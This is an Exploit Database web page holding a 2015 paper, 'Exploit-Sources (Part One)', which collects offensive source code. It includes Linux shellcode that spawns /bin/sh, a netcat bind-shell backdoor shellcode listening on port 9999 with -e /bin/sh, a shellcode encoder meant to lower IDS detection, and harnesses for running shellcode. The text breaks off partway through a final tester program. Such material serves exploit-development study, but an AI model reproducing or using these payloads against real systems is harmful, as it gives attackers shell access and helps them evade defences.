<!DOCTYPE html>
<html lang="en">

<head>
    <script src="/js/core/jquery.min.js"></script>
    <meta charset="utf-8"/>
    <meta name="csrf-token" content="fkMcNARTmEyCmkXzKnLN1sg33W193KsekObaQ8FU">

    <link rel="manifest" href="/manifest.json">

    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>

    
    <title>Exploit-Sources (Part One)</title>

    <!-- Prism code colouring -->
    <link rel="stylesheet" href="/css/prism.css">

    <!-- prism.js syntax highlighter -->
    <script src="/js/clipboard.js"></script>
    <script src="/js/prism.js"></script>

    <link rel="canonical" href="https://www.exploit-db.com/papers/36030">
    <meta name="description" content="Exploit-Sources (Part One)">
    <meta name="keywords" content="Multiple,papers">
    <meta name="author" content="Flor Ian">

    <meta property="og:title" content="Exploit-Sources (Part One)">
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://www.exploit-db.com/exploits/36030">
    <meta property="og:image" content="https://www.exploit-db.com/images/spider-orange.png" />
    <meta property="og:site_name" content="Exploit Database" />
    <meta property="article:published_time" content="2015-02-09" />
        <meta property="article:author" content="Flor Ian" />
    <meta property="article:authorUrl" content="https://www.exploit-db.com/?author=7691" />

    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@ExploitDB">
    <meta name="twitter:title" content="Exploit-Sources (Part One)">
    <meta name="twitter:creator" content="@ExploitDB">
    <meta name="twitter:image:src" content="https://www.exploit-db.com/images/spider-orange.png">


    <link rel="alternate" type="application/rss+xml" title="Exploit-DB.com RSS Feed" href="/rss.xml">

    <meta
            content='width=device-width, initial-scale=1.0, shrink-to-fit=no'
            name='viewport'/>

    <meta property="og:title" content="Offensive Security&#8217;s Exploit Database Archive">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.exploit-db.com/">

    <meta name="theme-color" content="#ec5e10">

    <script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5cfe7093-608f-4f4e-80b4-925b1e9d949f"
            data-georegions="{'region':'US-06','cbid':'6abbf59f-78fd-4d8f-ac7e-b57c0f046bbf'}" data-blockingmode="auto"
            type="text/javascript">
    </script>

    <script type="text/javascript">
        window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
        ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );

        ga('send', 'pageview');
    </script>
    <script async src="https://www.google-analytics.com/analytics.js"
            type="text/javascript">

    </script>

    <!-- Material Design Icons https://materialdesignicons.com/ -->
    <link href="/css/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css"/>

    <!-- Theme CSS Files -->
    <link href="/css/bootstrap.min.css" rel="stylesheet"/>

    <link href="/css/now-ui-dashboard.css" rel="stylesheet"/>

    <link href="/css/app.css" rel="stylesheet"/>

    <style>
        .rbtn {
            border: 2px solid white;
            border-radius: 20px;
            color: black;
            padding: 8px;
            cursor: pointer;
        }

        .rsuccess {
            border-color: white;
            color: white;
        }

        .rsuccess:hover {
            background-color: white;
            color: #165283;
        }
        .rprimary {
            border-color: #ca4f0c;
            color: #ca4f0c;
        }

        .rprimary:hover {
            background-color: #ca4f0c;
            color: white;
        }
    </style>
</head>

<body class=" sidebar-mini">

<div class="wrapper">

    
    <div class="sidebar" data-color="orange">

    <div class="logo">

        
        <a href="/" class="simple-text logo-mini">
            &nbsp;<img src="/images/spider-white.png" alt="Exploit Database">
        </a>

        
        
            <a href="/" class="simple-text logo-normal">
                Exploit Database
            </a>

        
    </div>

    <div class="sidebar-wrapper">

        <ul class="nav">

            
            <li class="">

                <a href="/">
                    <i class="mdi mdi-ladybug mdi-24px"></i>
                    <p>Exploits</p>
                </a>

            </li>

            
            <li class="">

                <a href="/google-hacking-database">
                    <i class="mdi mdi-search-web mdi-24px"></i>
                    <p title="Google Hacking Database">GHDB</p>
                </a>

            </li>

            
            <li class="active">

                <a href="/papers">
                    <i class="mdi mdi-file-outline mdi-24px"></i>
                    <p>Papers</p>
                </a>

            </li>

            
            <li class="">

                <a href="/shellcodes">
                    <i class="mdi mdi-chip mdi-24px"></i>
                    <p>Shellcodes</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">



                <li>

                    <a class="nav-link" href="/search">
                        <i class="mdi mdi-database-search mdi-24px"></i>
                        <p title="Search Exploit-Database">Search EDB</p>
                    </a>

                </li>



            <li>

                
                <a class="nav-link" href="/searchsploit">
                    <i class="mdi mdi-book-open-page-variant mdi-24px"></i>
                    <p>SearchSploit Manual</p>
                </a>

            </li>

            <li>

                
                <a class="nav-link" href="/submit">
                    <i class="mdi mdi-upload mdi-24px"></i>
                    <p>Submissions</p>
                </a>

            </li>

        </ul>

        <hr/>

        <ul class="nav">

            <li>

                <a data-toggle="collapse" href="#onlineTraining" aria-expanded="false">
                    <i class="mdi mdi-school mdi-24px"></i>
                    <p>Online Training <b class="caret"></b></p>
                </a>

                <div class="collapse " id="onlineTraining">
                    <ul class="nav">

                        <li>
                            <a href="/pentest-training-with-kali-linux">
                                <span class="sidebar-mini-icon">PWK</span>
                                <span class="sidebar-normal" title="Penetration Testing with Kali Linux"> PEN-200 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/wireless-attacks-training">
                                <span class="sidebar-mini-icon">WiFu</span>
                                <span class="sidebar-normal" title="Offensive Security Wireless Attacks"> PEN-210 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/evasion-techniques-breaching-defenses">
                                <span class="sidebar-mini-icon">ETBD</span>
                                <span class="sidebar-normal" title="Evasion Techniques and Breaching Defenses"> PEN-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/advanced-web-attacks">
                                <span class="sidebar-mini-icon">AWAE</span>
                                <span class="sidebar-normal" title="Advanced Web Attacks and Exploitation"> WEB-300 </span>
                            </a>
                        </li>
                        <li>
                            <a href="/windows-user-mode-exploit-development">
                                <span class="sidebar-mini-icon">WUMED</span>
                                <span class="sidebar-normal" title="Windows User Mode Exploit Development"> EXP-301 </span>
                            </a>
                        </li>
                    </ul>

                </div>

            </li>

<!--
            <li>

                <a class="nav-link" href="#" data-toggle="modal" data-target="#osresources">
                    <i class="mdi mdi-link-variant mdi-24px"></i>
                    <p>Offsec Resources</p>
                </a>

            </li>
-->
        </ul>

    </div>

</div>

    <div class="main-panel">

        
        <nav class="navbar navbar-expand-lg navbar-transparent  navbar-absolute
  bg-primary">

    <div class="container-fluid">

        <div class="navbar-wrapper">

            <div class="navbar-toggle">
                <button type="button" class="navbar-toggler" aria-label="Toggle Navigation">
                    <span class="navbar-toggler-bar bar1"></span>
                    <span class="navbar-toggler-bar bar2"></span>
                    <span class="navbar-toggler-bar bar3"></span>
                </button>
            </div>

            
            <a class="navbar-brand" href="/">
                <img src="/images/edb-banner-logo-white.png" height="60" alt="Exploit Database">
            </a>

        </div>

        
        <div class="collapse navbar-collapse justify-content-end" id="navigation">

            <ul class="navbar-nav">

                
                    

                        
                           
                           

                            
                            
                                
                            
                        

                        

                            
                                
                            

                            
                               
                                                     
                                
                            

                            
                                
                            

                        
                    
                

                
                    

                        
                            
                            
                                
                            
                        

                    
                

                <li class="nav-item">

                    
                    <a class="nav-link" href="/exploit-database-statistics" aria-label="Exploit Database Statistics">
                        <i class="mdi mdi-chart-bar-stacked mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">Stats</span>
                        </p>
                    </a>

                </li>

                <li class="nav-item dropdown">

                    
                    <a class="nav-link dropdown-toggle" href="/"
                       id="navbarDropdownMenuLink" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" aria-label="Site Information">

                        <i class="mdi mdi-information-outline mdi-24px"></i>
                        <p>
                            <span class="d-lg-none d-md-block">About Us</span>
                        </p>
                    </a>

                    <div class="dropdown-menu dropdown-menu-right"
                         aria-labelledby="navbarDropdownMenuLink">

                        <a class="dropdown-item" href="#" data-toggle="modal" data-target="#about" aria-label="About Exploit-DB">
                            About Exploit-DB
                        </a>

                        <a class="dropdown-item" href="/history" aria-label="Exploit-DB History">
                            Exploit-DB History
                        </a>

                        <a class="dropdown-item" href="/faq" aria-label="FAQ">
                            FAQ
                        </a>

                    </div>

                </li>

                
                                    <li class="nav-item">

                        <a class="nav-link" href="#" data-toggle="modal" data-target="#search" aria-label="Search Exploit-DB">
                            <i class="mdi mdi-database-search mdi-24px"></i>
                            <p>
                                <span class="d-lg-none d-md-block">Search</span>
                            </p>
                        </a>

                    </li>

                
            </ul>

        </div>

    </div>

</nav>

        
        
    <div class="panel-header panel-header-sm"></div>

    <div class="content">

        <div class="row">

            <div class="col-md-12">

                
                <div class="card">

                    <div class="card-body">

                        <div class="row justify-content-md-center">

                            
                            <h1 class="card-title text-secondary text-center" style="font-size: 2.5em;">
                                Exploit-Sources (Part One)
                            </h1>

                        </div>

                        
                        <div class="ml-2 mr-2">

                            <div class="row">

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                EDB-ID:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                36030
                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                CVE:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                                                                                        N/A

                                                                
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>EDB Verified:</strong>
                                                <i class="mdi mdi-24px mdi-check"
                                                   style="color: #96b365">
                                                </i>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Author:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?author=7691">
                                                                    Flor Ian
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Type:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?type=papers">
                                                                    papers
                                                                </a>

                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer">

                                            <div class="stats h6 text-center">

                                                <!-- Display a checkmark if the exploit is verified and an X if not -->
                                                <strong>Paper: </strong>
                                                <a href="/download/36030" data-toggle="tooltip" data-placement="top"
                                                   title="Download" aria-label="Download Paper 36030">
                                                    <i class="mdi mdi-download mdi-24px text-primary"></i>
                                                </a>
                                                &nbsp; / &nbsp;
                                                <a href="/raw/36030" data-toggle="tooltip" data-placement="top"
                                                   title="View Raw" aria-label="View Raw 36030">
                                                    <i class="mdi mdi-code-braces mdi-24px text-primary"></i>
                                                </a>

                                            </div>

                                        </div>

                                    </div>

                                </div>

                                <div class="col-sm-12 col-md-4">

                                    <div class="card card-stats">

                                        <div class="card-body ">

                                            <div class="statistics statistics-horizontal">

                                                <div class="info info-horizontal">

                                                    <div class="row">

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Platform:
                                                            </h3>

                                                            <h6 class="stats-title">

                                                                <a href="/?platform=multiple">
                                                                    Multiple
                                                                </a>

                                                            </h6>

                                                        </div>

                                                        <div class="col-6 text-center">

                                                            <h3 class="info-title">
                                                                Published:
                                                            </h3>

                                                            <h6 class="stats-title">
                                                                2015-02-09
                                                            </h6>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <hr/>

                                        <div class="card-footer ">

                                            <div class="stats h6 text-center">

                                                
                                                <strong>Vulnerable App:</strong>

                                                
                                            </div>

                                        </div>

                                    </div>

                                </div>

                            </div>

                            <div class="row">

                                <div class="btn-group ml-3">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/35952" aria-label="View Previous Paper"
                                       data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                        <i class="mdi mdi-arrow-left mdi-36px"></i>
                                    </a>

                                </div>


                                <div class="col">

                                    <div class="btn-group float-right">

                                        <a class="btn btn-primary btn-fab btn-icon btn-round"
                                           href="/papers/36069" aria-label="View Next Paper"
                                           data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                            <i class="mdi mdi-arrow-right mdi-36px"></i>
                                        </a>

                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                
                <div class="card">

                    <div class="card-body">

                        
                        <pre><code class="language-txt" style="white-space: pre-wrap;">------------------				-------------------
|||		     Exploit-Sources(Part One)			|||
|||			    MINDZSEC				|||
|||		  Contact:flor_iano@hotmail.com			|||
|||								|||
------------------				-------------------


[Introduction]
This paper is about sources to make hacking done and different 
exploits by others.Here i have collected the most used sources
to conduct a [Penetration Test][Hacking][Exploit Development]
[Forensics][Stack Smashing].Here we go with sources.

[Sources]
#------------------------------------------------------------------#

[Get_SP.c]
/* Get stack pointer of the system(Unix/Linux) */
#iclude &lt;stdio.h&gt;
unsigned long get_sp(void) {
   __asm__(&quot;movl %esp,%eax&quot;);
}
void main() {
  printf(&quot;0x%x\n&quot;, get_sp());
}

#------------------------------------------------------------------#

#------------------------------------------------------------------#

[Getshell.asm]
;Universal Shellcode for Unix/Linux 
section .text           ; Text section
        global _start   ; Define _start function

_start:                 ; _start function
xor eax, eax            ; Zero out eax REGister
xor ebx, ebx            ; Zero out ebx REGister
xor ecx, ecx            ; Zero out ecx REGister
cdq                     ; Zero out edx using the sign bit from eax
push ecx                ; Insert 4 byte null in stack
push 0x68732f6e         ; Insert /bin in the stack
push 0x69622f2f         ; Insert //sh in the stack
mov  ebx, esp           ; Put /bin//sh in stack
push ecx                ; Put 4 Byte in stack
push ebx                ; Put ebx in stack
mov  ecx, esp           ; Insert ebx address in ecx
xor  eax, eax           ; Zero out eax register
mov  al, 11             ; Insert __NR_execve 11 syscall
int  0x80               ; Syscall execute

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[Netcat.asm]
;Author Flor Ian MINDZSEC
;Contact flor_iano@hotmail.com
;Program to make a netcat backdoor to inject as a shellcode
jmp short todo
shellcode:
xor eax, eax 		; Zero out eax
xor ebx, ebx		; Zero out ebx
xor ecx, ecx		; Zero out ecx
xor edx, edx		; Zero out edx using the sign bit from eax
mov BYTE al, 0xa4 	; setresuid syscall 164 (0xa4)
int 0x80		; syscall execute
pop esi			; esi contain the string in db
xor eax, eax		; Zero out eax
mov[esi + 7], al	; null terminate /bin/nc
mov[esi +  16], al 	; null terminate -lvp90
mov[esi +  26], al	; null terminate -e/bin/sh
mov[esi +  27], esi	; store address of /bin/nc in AAAA
lea ebx, [esi + 8]	; load address of -lvp90 into ebx
mov[esi +31], ebx	; store address of -lvp90 in BBB taken from ebx
lea ebx, [esi + 17]	; load address of -e/bin/sh into  ebx
mov[esi + 35], ebx	; store address of -e/bin/sh in CCCC taken from ebx
mov[esi + 39], eax 	; Zero out DDDD
mov al, 11		; 11 is execve  syscakk number
mov ebx, esi		; store address of  /bin/nc 
lea ecx, [esi + 27]	; load address of ptr to argv[] array
lea edx, [esi + 39] 	; envp[] NULL
int 0x80		; syscall execute 
todo:
call shellcode
db &#039;/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD&#039;
;   0123456789012345678901234567890123456789012

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[AsmCompiler.sh]
#!/bin/bash
if [ $# -ne 1 ]
then
    printf &quot;\n\tUsage: $0 filename\n\n&quot;
    exit
fi
filename=`echo $1 | sed s/&quot;\$&quot;//`
nasm -f elf $filename.asm &amp;&amp; ld $filename.o -o $filename

echo &quot;Successfully compiled.&quot;

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[XXDShellcode.sh]
#Get Shellcode form an executable file
#!/bin/bash
if [ $# -ne 1 ]
then
    printf &quot;\n\tUsage: $0 filename.o\n\n&quot;
    exit
fi
filename=`echo $1 | sed s/&quot;\$&quot;//`
rm -f $filename.shellcode

objdump -d $filename | grep &#039;[0-9a-f]:&#039; | 
grep -v &#039;file&#039; | cut -f2 -d: |
 cut -f1-6 -d&#039; &#039; | tr -s &#039; &#039; | tr &#039;\t&#039; &#039; &#039; | 
sed &#039;s/ $//g&#039; | sed &#039;s/ /\\x/g&#039; | paste -d &#039;&#039; -s |
 sed &#039;s/^/&quot;/&#039; | sed &#039;s/$/&quot;/g&#039;

echo

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[S-Proc.c]
/* Test Shellcode */
/*
 * Generic program for testing shellcode byte arrays.
 * Created by zillion and EVL
 *
 * Safemode.org !! Safemode.org !!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;

/*
 * Print message
 */
static void
croak(const char *msg) {
    fprintf(stderr, &quot;%s\n&quot;, msg);
    fflush(stderr);
}
/*
 * Educate user.
 */
static void
usage(const char *prgnam) {
    fprintf(stderr, &quot;\nExecute code : %s -e &lt;file-containing-shellcode&gt;\n&quot;, prgnam);
    fprintf(stderr, &quot;Convert code : %s -p &lt;file-containing-shellcode&gt; \n\n&quot;, prgnam);
    fflush(stderr);
    exit(1);
}
/*
 * Signal error and bail out.
 */
static void
barf(const char *msg) {
    perror(msg);
    exit(1);
}

/*
 * Main code starts here
 */

int
main(int argc, char **argv) {
    FILE        *fp;
    void        *code;
    int         arg;
    int         i;
    int         l;
    int     m = 15; /* max # of bytes to print on one line */

    struct stat sbuf;
    long        flen;   /* Note: assume files are &lt; 2**32 bytes long ;-) */
    void        (*fptr)(void);

    if(argc &lt; 3) usage(argv[0]);
    if(stat(argv[2], &amp;sbuf)) barf(&quot;failed to stat file&quot;);
    flen = (long) sbuf.st_size;
    if(!(code = malloc(flen))) barf(&quot;failed to grab required memeory&quot;);
    if(!(fp = fopen(argv[2], &quot;rb&quot;))) barf(&quot;failed to open file&quot;);
    if(fread(code, 1, flen, fp) != flen) barf(&quot;failed to slurp file&quot;);
    if(fclose(fp)) barf(&quot;failed to close file&quot;);
    
    while ((arg = getopt (argc, argv, &quot;e:p:&quot;)) != -1){ 
      switch (arg){ 
      case &#039;e&#039;: 
        croak(&quot;Calling code ...&quot;);
        fptr = (void (*)(void)) code;
        (*fptr)();
        break; 
      case &#039;p&#039;:       
        printf(&quot;\n\nchar shellcode[] =\n&quot;);
        l = m;
        for(i = 0; i &lt; flen; ++i) {
          if(l &gt;= m) {
            if(i) printf(&quot;\&quot;\n&quot;);
            printf( &quot;\t\&quot;&quot;);
            l = 0;
          }
          ++l;
          printf(&quot;\\x%02x&quot;, ((unsigned char *)code)[i]);
        }
        printf(&quot;\&quot;;\n\n\n&quot;);
        
        break; 
      default :       
        usage(argv[0]); 
      } 
    } 
    
    
    return 0;
}

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[ShellcodeEncode.c]
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

/*
 *  Shellcode encoder 0.1 by zillion (safemode.org)
 *
 *  Wish list :
 *  -----------
 *
 *  - Make the decoder polymorphic  
 *  - Add OS detection (see safemode)
 *
 *  How to use it :
 *  ---------------
 *
 *  Replace the shellcode with any shellcode, compile this file
 *  and execute it. The decoder is OS independent and can thus be
 *  used for any OS on Intel. The purpose: 
 *
 *  - Lower chance of IDS detection 
 *  - Counter difficult characters
 *  - Confuse sans students  ;-) 
 *
 *  The decoder :
 *  -------------
 *  
 *  jmp short go
 *  next:
 *
 *  pop             esi           
 *  xor             ecx,ecx
 *  mov             cl,11 
 *  change:
 *  sub byte        [esi + ecx - 1 ],11
 *  sub             cl, 1
 *  jnz change
 *  jmp short ok
 *  go:
 *  call next
 *  ok:
 *  &lt;shellcode comes here&gt;
 *
 */

void execute(char *  data);

int main() {

char decoder[] =
        &quot;\xeb\x11\x5e\x31\xc9\xb1\x00\x80\x6c\x0e\xff\x00\x80\xe9\x01&quot;
        &quot;\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff&quot;;

char shellcode[] =
        &quot;\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd&quot;
        &quot;\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23&quot;;

char tmp;
char *end;
int size  = 53;
int i; 
int l = 15;

for(i=0;i&lt;strlen(shellcode);i++) {

   shellcode[i] += size;

}
        decoder[6]  += strlen(shellcode);
        decoder[11] += size;

end = (char *) malloc(strlen(shellcode) + strlen(decoder));

strcat(end,decoder);
strcat(end,shellcode);

        printf(&quot;\n\nchar shellcode[] =\n&quot;);

        for(i = 0; i &lt; strlen(end); ++i) {
          if(l &gt;= 15) {
            if(i) printf(&quot;\&quot;\n&quot;);
            printf( &quot;\t\&quot;&quot;);
            l = 0;
          }
          ++l;
          printf(&quot;\\x%02x&quot;, ((unsigned char *)end)[i]);
        }

execute(end);
free(end);
}


void execute(char *data) {

int *ret;
ret = (int *)&amp;ret + 2;
(*ret) = (int)data;

}

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[Shtester.c]
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;
#include &lt;ctype.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt; /* See NOTES */
#include &lt;sys/wait.h&gt;
#include &lt;sys/socket.h&gt;

/*------------------------------------------
    Shellcode testing program
    Usage:
        shtest [-s socked_fd_no] {-f file | $&#039;\xeb\xfe&#039; | &#039;\xb8\x39\x05\x00\x00\xc3&#039;}
    Usage example:
        $ shtest $&#039;\xeb\xfe&#039;                 # raw shellcode
        $ shtest &#039;\xb8\x39\x05\x00\x00\xc3&#039;  # escaped shellcode
        $ shtest -f test.sc                  # shellcode from file
        $ shtest -f &lt;(python gen_payload.py) # test generated payload
        $ shtest -s 5 -f test.sc             # create socket at fd=5
            # Allows to test staged shellcodes
            # Flow is redirected like this: STDIN -&gt; SOCKET -&gt; STDOUT
    Compiling:
        gcc -Wall shtest.c -o shtest
    Author: hellman (hellman1908@gmail.com)
-------------------------------------------*/

char buf[4096];
int pid1, pid2;
int sock;
int ready;

void usage(char * err);
int main(int argc, char **argv);

void load_from_file(char *fname);
void copy_from_argument(char *arg);
void escape_error();

int create_sock();
void run_reader(int);
void run_writer(int);
void set_ready(int sig);

void run_shellcode(void *sc_ptr);


void usage(char * err) {
    printf(&quot;    Shellcode testing program\n\
    Usage:\n\
        shtest {-f file | $&#039;\\xeb\\xfe&#039; | &#039;\\xb8\\x39\\x05\\x00\\x00\\xc3&#039;}\n\
    Usage example:\n\
        $ shtest $&#039;\\xeb\\xfe&#039;                 # raw shellcode\n\
        $ shtest &#039;\\xb8\\x39\\x05\\x00\\x00\\xc3&#039;  # escaped shellcode\n\
        $ shtest -f test.sc                  # shellcode from file\n\
        $ shtest -f &lt;(python gen_payload.py) # test generated payload\n\
        $ shtest -s 5 -f test.sc             # create socket at fd=5 (STDIN &lt;- SOCKET -&gt; STDOUT)\n\
            # Allows to test staged shellcodes\
            # Flow is redirected like this: STDIN -&gt; SOCKET -&gt; STDOUT\
    Compiling:\n\
        gcc -Wall shtest.c -o shtest\n\
    Author: hellman (hellman1908@gmail.com)\n&quot;);
    if (err) printf(&quot;\nerr: %s\n&quot;, err);
    exit(1);
}

int main(int argc, char **argv) {
    char * fname = NULL;
    int c;

    pid1 = pid2 = -1;
    sock = -1;

    while ((c = getopt(argc, argv, &quot;hus:f:&quot;)) != -1) {
        switch (c) {
            case &#039;f&#039;:
                fname = optarg;
                break;
            case &#039;s&#039;:
                sock = atoi(optarg);
                if (sock &lt;= 2 || sock &gt; 1024)
                    usage(&quot;bad descriptor number for sock&quot;);
                break;
            case &#039;h&#039;:
            case &#039;u&#039;:
                usage(NULL);
            default:
                usage(&quot;unknown argument&quot;);
        }
    }

    if (argc == 1)
        usage(NULL);

    if (optind &lt; argc &amp;&amp; fname)
        usage(&quot;can&#039;t load shellcode both from argument and file&quot;);
    
    if (!(optind &lt; argc) &amp;&amp; !fname)
        usage(&quot;please provide shellcode via either argument or file&quot;);

    if (optind &lt; argc) {
        copy_from_argument(argv[optind]);
    }
    else {
        load_from_file(fname);
    }

    //create socket if needed
    if (sock != -1) {
        int created_sock = create_sock(sock);
        printf(&quot;Created socket %d\n&quot;, created_sock);
    }

    run_shellcode(buf);
    return 100;
}

void load_from_file(char *fname) {
    FILE * fd = fopen(fname, &quot;r&quot;);
    if (!fd) {
        perror(&quot;fopen&quot;);
        exit(100);
    }

    int c = fread(buf, 1, 4096, fd);
    printf(&quot;Read %d bytes from &#039;%s&#039;\n&quot;, c, fname);
    fclose(fd);
}

void copy_from_argument(char *arg) {
    //try to translate from escapes ( \xc3 )

    bzero(buf, sizeof(buf));
    strncpy(buf, arg, sizeof(buf));

    int i;
    char *p1 = buf;
    char *p2 = buf;
    char *end = p1 + strlen(p1);

    while (p1 &lt; end) {
        i = sscanf(p1, &quot;\\x%02x&quot;, (unsigned int *)p2);
        if (i != 1) {
            if (p2 == p1) break;
            else escape_error();
        }

        p1 += 4;
        p2 += 1;
    }
}

void escape_error() {
    printf(&quot;Shellcode is incorrectly escaped!\n&quot;);
    exit(1);
}

int create_sock() {
    int fds[2];
    int sock2;
        
    int result = socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
    if (result == -1) {
        perror(&quot;socket&quot;);
        exit(101);
    }

    if (sock == fds[0]) {
        sock2 = fds[1];
    }
    else if (sock == fds[1]) {
        sock2 = fds[0];
    }
    else {
        dup2(fds[0], sock);
        close(fds[0]);
        sock2 = fds[1];
    }

    ready = 0;
    signal(SIGUSR1, set_ready);

    /*
    writer: stdin -&gt; socket (when SC exits/fails, receives SIGCHLD and exits)
    \--&gt; main: shellcode (when exits/fails, sends SIGCHLD to writer and closes socket)
         \--&gt; reader: sock -&gt; stdout (when SC exits/fails, socket is closed and reader exits)
    main saves pid1 = reader,
               pid2 = writer
    to send them SIGUSR1 right before running shellcode
    */

    pid1 = fork();
    if (pid1 == 0) {
        close(sock);
        run_reader(sock2);
    }

    pid2 = fork();
    if (pid2 &gt; 0) { // parent - writer
        signal(SIGCHLD, exit);
        close(sock);
        run_writer(sock2);
    }
    pid2 = getppid();

    close(sock2);
    return sock;
}

void run_reader(int fd) {
    char buf[4096];
    int n;

    while (!ready) {
        usleep(0.1);
    }

    while (1) {
        n = read(fd, buf, sizeof(buf));
        if (n &gt; 0) {
            printf(&quot;RECV %d bytes FROM SOCKET: &quot;, n);
            fflush(stdout);
            write(1, buf, n);
        }
        else {
            exit(0);
        }
    }
}

void run_writer(int fd) {
    char buf[4096];
    int n;
    
    while (!ready) {
        usleep(0.1);
    }

    while (1) {
        n = read(0, buf, sizeof(buf));
        if (n &gt; 0) {
            printf(&quot;SENT %d bytes TO SOCKET\n&quot;, n);
            write(fd, buf, n);
        }
        else {
            shutdown(fd, SHUT_WR);
            close(fd);
            wait(&amp;n);
            exit(0);
        }
    }
}

void set_ready(int sig) {
    ready = 1;
}

void run_shellcode(void *sc_ptr) {
    int ret = 0, status = 0;
    int (*ptr)();
    
    ptr = sc_ptr;
    mprotect((void *) ((unsigned int)ptr &amp; 0xfffff000), 4096 * 2, 7);
    
    void *esp, *ebp;
    void *edi, *esi;

    asm (&quot;movl %%esp, %0;&quot;
         &quot;movl %%ebp, %1;&quot;
         :&quot;=r&quot;(esp), &quot;=r&quot;(ebp));
    
    asm (&quot;movl %%esi, %0;&quot;
         &quot;movl %%edi, %1;&quot;
         :&quot;=r&quot;(esi), &quot;=r&quot;(edi)); 
    
    printf(&quot;Shellcode at %p\n&quot;, ptr);
    printf(&quot;Registers before call:\n&quot;);
    printf(&quot;  esp: %p, ebp: %p\n&quot;, esp, ebp);
    printf(&quot;  esi: %p, edi: %p\n&quot;, esi, edi);

    printf(&quot;----------------------\n&quot;);
    if (pid1 &gt; 0) kill(pid1, SIGUSR1);
    if (pid2 &gt; 0) kill(pid2, SIGUSR1);

    ret = (*ptr)();

    if (sock != -1)
        close(sock);
    
    wait(&amp;status);

    printf(&quot;----------------------\n&quot;);
    
    printf(&quot;Shellcode returned %d\n&quot;, ret);
    exit(0);
}

#------------------------------------------------------------------#

#------------------------------------------------------------------#
[C ProgramToTestShellcode.c]
#include &lt;stdio.h&gt;  //IO header
#include &lt;string.h&gt; //Functions on favor of strings
#include &lt;stdlib.h&gt; //exit() function
char shellcode[] = &quot;&quot;; 				/* Global array */
int main(int argc, char **argv)
{
	int (*ret)(); 				/* ret is a func pointer*/
	ret = (int(*)())shellcode; 		/* ret points to our shellcode */
	
	(int)(*ret)();				/* shellcode is type caste as a function */
	exit(0);					/* exit() */
}

#------------------------------------------------------------------#
[Mman.c]
/* Sys mman shellcode tester */
#include &lt;stdio.h&gt;		
#include &lt;sys/mman.h&gt;		
#include &lt;string.h&gt; 		
#include &lt;stdlib.h&gt;		
#include &lt;unistd.h&gt;		

int (*shellcodetotest)(); 	
char shellcode[] = &quot;&quot;;	/* Put your shellcode here */

int main(int argc, char **argv) 
{
	void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
	if(ptr == MAP_FAILED)  
	{
		perror(&quot;mmap&quot;);	
